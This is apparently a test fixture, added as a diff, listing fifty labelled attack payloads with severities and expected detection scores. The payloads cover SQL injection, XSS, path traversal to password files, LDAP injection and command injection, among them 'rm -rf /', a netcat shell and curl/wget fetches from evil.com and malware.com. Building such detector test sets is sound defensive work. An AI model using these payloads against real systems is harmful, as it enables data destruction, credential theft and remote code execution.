@@ -1,0 +1,402 @@
+[
+  {
+    "id": "sql_1",
+    "type": "sql_injection",
+    "payload": "'; DROP TABLE users; --",
+    "severity": "high",
+    "expected_score": 0.8284604687164323,
+    "description": "SQL Injection variant 1"
+  },
+  {
+    "id": "sql_2",
+    "type": "sql_injection",
+    "payload": "' UNION SELECT * FROM admin --",
+    "severity": "high",
+    "expected_score": 0.8809211004473244,
+    "description": "SQL Injection variant 2"
+  },
+  {
+    "id": "sql_3",
+    "type": "sql_injection",
+    "payload": "' OR '1'='1' --",
+    "severity": "high",
+    "expected_score": 0.9487162946651293,
+    "description": "SQL Injection variant 3"
+  },
+  {
+    "id": "sql_4",
+    "type": "sql_injection",
+    "payload": "'; INSERT INTO users VALUES ('hacker', 'password'); --",
+    "severity": "high",
+    "expected_score": 0.9705567196413645,
+    "description": "SQL Injection variant 4"
+  },
+  {
+    "id": "sql_5",
+    "type": "sql_injection",
+    "payload": "' AND (SELECT COUNT(*) FROM users) > 0 --",
+    "severity": "high",
+    "expected_score": 0.9027413287022547,
+    "description": "SQL Injection variant 5"
+  },
+  {
+    "id": "sql_6",
+    "type": "sql_injection",
+    "payload": "'; EXEC xp_cmdshell('dir'); --",
+    "severity": "high",
+    "expected_score": 0.8667811588699745,
+    "description": "SQL Injection variant 6"
+  },
+  {
+    "id": "sql_7",
+    "type": "sql_injection",
+    "payload": "' UNION SELECT username, password FROM users --",
+    "severity": "high",
+    "expected_score": 0.8742005928251944,
+    "description": "SQL Injection variant 7"
+  },
+  {
+    "id": "sql_8",
+    "type": "sql_injection",
+    "payload": "'; UPDATE users SET password='hacked' WHERE id=1; --",
+    "severity": "high",
+    "expected_score": 0.96736291764266,
+    "description": "SQL Injection variant 8"
+  },
+  {
+    "id": "sql_9",
+    "type": "sql_injection",
+    "payload": "' OR 1=1 LIMIT 1 OFFSET 1 --",
+    "severity": "high",
+    "expected_score": 0.9678493420814618,
+    "description": "SQL Injection variant 9"
+  },
+  {
+    "id": "sql_10",
+    "type": "sql_injection",
+    "payload": "'; DELETE FROM logs WHERE date < '2023-01-01'; --",
+    "severity": "high",
+    "expected_score": 0.9569288933077338,
+    "description": "SQL Injection variant 10"
+  },
+  {
+    "id": "xss_1",
+    "type": "xss",
+    "payload": "<script>alert('XSS')</script>",
+    "severity": "high",
+    "expected_score": 0.894718390028035,
+    "description": "XSS attack variant 1"
+  },
+  {
+    "id": "xss_2",
+    "type": "xss",
+    "payload": "<img src=x onerror=alert('XSS')>",
+    "severity": "high",
+    "expected_score": 0.9147854638250588,
+    "description": "XSS attack variant 2"
+  },
+  {
+    "id": "xss_3",
+    "type": "xss",
+    "payload": "javascript:alert('XSS')",
+    "severity": "high",
+    "expected_score": 0.7580110517582861,
+    "description": "XSS attack variant 3"
+  },
+  {
+    "id": "xss_4",
+    "type": "xss",
+    "payload": "<svg onload=alert('XSS')>",
+    "severity": "high",
+    "expected_score": 0.9352717540861123,
+    "description": "XSS attack variant 4"
+  },
+  {
+    "id": "xss_5",
+    "type": "xss",
+    "payload": "<iframe src=javascript:alert('XSS')></iframe>",
+    "severity": "high",
+    "expected_score": 0.7071191607182754,
+    "description": "XSS attack variant 5"
+  },
+  {
+    "id": "xss_6",
+    "type": "xss",
+    "payload": "<body onload=alert('XSS')>",
+    "severity": "high",
+    "expected_score": 0.945422541199087,
+    "description": "XSS attack variant 6"
+  },
+  {
+    "id": "xss_7",
+    "type": "xss",
+    "payload": "<input onfocus=alert('XSS') autofocus>",
+    "severity": "high",
+    "expected_score": 0.7214154483350983,
+    "description": "XSS attack variant 7"
+  },
+  {
+    "id": "xss_8",
+    "type": "xss",
+    "payload": "<select onfocus=alert('XSS') autofocus>",
+    "severity": "high",
+    "expected_score": 0.8125551879734805,
+    "description": "XSS attack variant 8"
+  },
+  {
+    "id": "xss_9",
+    "type": "xss",
+    "payload": "<textarea onfocus=alert('XSS') autofocus>",
+    "severity": "high",
+    "expected_score": 0.8442737526315938,
+    "description": "XSS attack variant 9"
+  },
+  {
+    "id": "xss_10",
+    "type": "xss",
+    "payload": "<keygen onfocus=alert('XSS') autofocus>",
+    "severity": "high",
+    "expected_score": 0.8555880271575264,
+    "description": "XSS attack variant 10"
+  },
+  {
+    "id": "path_1",
+    "type": "path_traversal",
+    "payload": "../../../etc/passwd",
+    "severity": "medium",
+    "expected_score": 0.6922976156051668,
+    "description": "Path traversal variant 1"
+  },
+  {
+    "id": "path_2",
+    "type": "path_traversal",
+    "payload": "..\\..\\..\\windows\\system32\\config\\sam",
+    "severity": "medium",
+    "expected_score": 0.6997084111503865,
+    "description": "Path traversal variant 2"
+  },
+  {
+    "id": "path_3",
+    "type": "path_traversal",
+    "payload": "....//....//....//etc/passwd",
+    "severity": "medium",
+    "expected_score": 0.8067371738184288,
+    "description": "Path traversal variant 3"
+  },
+  {
+    "id": "path_4",
+    "type": "path_traversal",
+    "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "severity": "medium",
+    "expected_score": 0.6344541595156825,
+    "description": "Path traversal variant 4"
+  },
+  {
+    "id": "path_5",
+    "type": "path_traversal",
+    "payload": "..%252f..%252f..%252fetc%252fpasswd",
+    "severity": "medium",
+    "expected_score": 0.6543578909057948,
+    "description": "Path traversal variant 5"
+  },
+  {
+    "id": "path_6",
+    "type": "path_traversal",
+    "payload": "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+    "severity": "medium",
+    "expected_score": 0.8545677482334744,
+    "description": "Path traversal variant 6"
+  },
+  {
+    "id": "path_7",
+    "type": "path_traversal",
+    "payload": "..//..//..//etc//passwd",
+    "severity": "medium",
+    "expected_score": 0.6114352063550706,
+    "description": "Path traversal variant 7"
+  },
+  {
+    "id": "path_8",
+    "type": "path_traversal",
+    "payload": "..\\..\\..\\boot.ini",
+    "severity": "medium",
+    "expected_score": 0.6163478341068543,
+    "description": "Path traversal variant 8"
+  },
+  {
+    "id": "path_9",
+    "type": "path_traversal",
+    "payload": "....\\....\\....\\windows\\win.ini",
+    "severity": "medium",
+    "expected_score": 0.7149456256996917,
+    "description": "Path traversal variant 9"
+  },
+  {
+    "id": "path_10",
+    "type": "path_traversal",
+    "payload": "%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini",
+    "severity": "medium",
+    "expected_score": 0.8646108936611021,
+    "description": "Path traversal variant 10"
+  },
+  {
+    "id": "cmd_1",
+    "type": "command_injection",
+    "payload": "; rm -rf /",
+    "severity": "critical",
+    "expected_score": 0.9456123958496059,
+    "description": "Command injection variant 1"
+  },
+  {
+    "id": "cmd_2",
+    "type": "command_injection",
+    "payload": "| cat /etc/passwd",
+    "severity": "critical",
+    "expected_score": 0.9456026351714178,
+    "description": "Command injection variant 2"
+  },
+  {
+    "id": "cmd_3",
+    "type": "command_injection",
+    "payload": "&& whoami",
+    "severity": "critical",
+    "expected_score": 0.8977910964014777,
+    "description": "Command injection variant 3"
+  },
+  {
+    "id": "cmd_4",
+    "type": "command_injection",
+    "payload": "; ls -la",
+    "severity": "critical",
+    "expected_score": 0.9478682367985483,
+    "description": "Command injection variant 4"
+  },
+  {
+    "id": "cmd_5",
+    "type": "command_injection",
+    "payload": "| nc -l -p 4444 -e /bin/sh",
+    "severity": "critical",
+    "expected_score": 0.8642026182344891,
+    "description": "Command injection variant 5"
+  },
+  {
+    "id": "cmd_6",
+    "type": "command_injection",
+    "payload": "&& curl http://evil.com/shell.sh | sh",
+    "severity": "critical",
+    "expected_score": 0.8838941817194471,
+    "description": "Command injection variant 6"
+  },
+  {
+    "id": "cmd_7",
+    "type": "command_injection",
+    "payload": "; wget http://malware.com/backdoor",
+    "severity": "critical",
+    "expected_score": 0.9940932914810338,
+    "description": "Command injection variant 7"
+  },
+  {
+    "id": "cmd_8",
+    "type": "command_injection",
+    "payload": "| python -c 'import os; os.system(\"rm -rf /\")'",
+    "severity": "critical",
+    "expected_score": 0.9537280771943134,
+    "description": "Command injection variant 8"
+  },
+  {
+    "id": "cmd_9",
+    "type": "command_injection",
+    "payload": "&& echo 'hacked' > /tmp/pwned",
+    "severity": "critical",
+    "expected_score": 0.9210493964492054,
+    "description": "Command injection variant 9"
+  },
+  {
+    "id": "cmd_10",
+    "type": "command_injection",
+    "payload": "; cat /proc/version",
+    "severity": "critical",
+    "expected_score": 0.8915671994296619,
+    "description": "Command injection variant 10"
+  },
+  {
+    "id": "ldap_1",
+    "type": "ldap_injection",
+    "payload": "*)(&(objectClass=*)",
+    "severity": "medium",
+    "expected_score": 0.720515555750967,
+    "description": "LDAP injection variant 1"
+  },
+  {
+    "id": "ldap_2",
+    "type": "ldap_injection",
+    "payload": "*)(uid=*))(|(uid=*",
+    "severity": "medium",
+    "expected_score": 0.676686365260184,
+    "description": "LDAP injection variant 2"
+  },
+  {
+    "id": "ldap_3",
+    "type": "ldap_injection",
+    "payload": "admin)(&(password=*))",
+    "severity": "medium",
+    "expected_score": 0.538740735712193,
+    "description": "LDAP injection variant 3"
+  },
+  {
+    "id": "ldap_4",
+    "type": "ldap_injection",
+    "payload": "*))(|(cn=*",
+    "severity": "medium",
+    "expected_score": 0.6030654321802975,
+    "description": "LDAP injection variant 4"
+  },
+  {
+    "id": "ldap_5",
+    "type": "ldap_injection",
+    "payload": "*))%00",
+    "severity": "medium",
+    "expected_score": 0.5648899607501086,
+    "description": "LDAP injection variant 5"
+  },
+  {
+    "id": "ldap_6",
+    "type": "ldap_injection",
+    "payload": "admin*",
+    "severity": "medium",
+    "expected_score": 0.7822643893765004,
+    "description": "LDAP injection variant 6"
+  },
+  {
+    "id": "ldap_7",
+    "type": "ldap_injection",
+    "payload": "*)(|(objectClass=*)",
+    "severity": "medium",
+    "expected_score": 0.5490514336111214,
+    "description": "LDAP injection variant 7"
+  },
+  {
+    "id": "ldap_8",
+    "type": "ldap_injection",
+    "payload": "*)(&(|(objectClass=*)(cn=*))",
+    "severity": "medium",
+    "expected_score": 0.5787647606042032,
+    "description": "LDAP injection variant 8"
+  },
+  {
+    "id": "ldap_9",
+    "type": "ldap_injection",
+    "payload": "*)(mail=*))%00",
+    "severity": "medium",
+    "expected_score": 0.7341084598996839,
+    "description": "LDAP injection variant 9"
+  },
+  {
+    "id": "ldap_10",
+    "type": "ldap_injection",
+    "payload": "admin))(|(uid=*",
+    "severity": "medium",
+    "expected_score": 0.5646904901783243,
+    "description": "LDAP injection variant 10"
+  }
+]
